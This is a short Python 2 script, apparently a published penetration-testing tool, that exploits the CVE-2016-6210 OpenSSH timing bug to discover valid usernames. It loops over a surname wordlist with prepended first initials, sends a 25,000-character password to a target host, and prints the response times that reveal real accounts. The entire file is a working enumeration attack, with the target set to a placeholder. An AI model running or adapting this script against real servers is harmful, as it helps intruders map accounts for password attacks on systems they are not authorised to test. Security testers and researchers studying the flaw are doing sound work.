#!/usr/bin/python
#
# enumer8-ssh.py
# Eric Conrad
# Twitter: @eric_conrad
# Github: https://github.com/eric-conrad/enumer8
#
# Reads a list of potential usernames and tests an openssh server
# for the CVE-2016-6210 opensshd timing attack bug
# Loops while prepending first initials to each name if guessinitial=1
# 
# Based on Eddie Harari's opensshd user enumeration POC
# http://seclists.org/fulldisclosure/2016/Jul/51

import sys
import os
import paramiko
import time
import string

file='wordlists/US-census2000-lastnames-top-100.txt'
host='www.example.com'
password='A'*25000
port=22

# Set to 1 to prepend a first initial
guessinitial=1

# Most popular first name initials in order, per the 1990 US census:
# initials="mjscladekbrtpgnvhfiwoyzuqx"
#
# First initials to guess, omits z, u, q and x. Season to taste
initials="mjscladekbrtpgnvhfiwoy"

def sshconnect(host, user, port, password):
  starttime=time.time()
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    ssh.connect(host, username=user, port=port, password=password)
  except:
    print round(time.time()-starttime,2), user

if (not os.path.isfile(file)):
  print "File does not exist:", file
  sys.exit(1)
infile = open(file, 'r')
for line in infile:
  user=line.strip()
  if (guessinitial==1):
    for init in initials:
      sshconnect(host, init+user, port, password)
  else:
    sshconnect(host, user, port, password)
